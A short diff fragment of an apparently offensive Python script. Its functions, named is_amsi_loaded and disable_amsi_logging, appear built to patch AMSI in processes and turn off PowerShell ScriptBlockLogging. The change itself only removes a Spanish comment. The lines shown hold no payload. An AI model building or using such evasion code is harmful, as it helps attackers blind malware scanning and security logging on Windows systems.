@@ -165,7 +165,7 @@ def is_amsi_loaded(proc):
 patched_processes = set()
 
 def disable_amsi_logging():
-    # Verificar si la clave de registro existe antes de intentar deshabilitarla
+   
     try:
         print("Verificando si ScriptBlockLogging está habilitado...")
         check_key = subprocess.run(
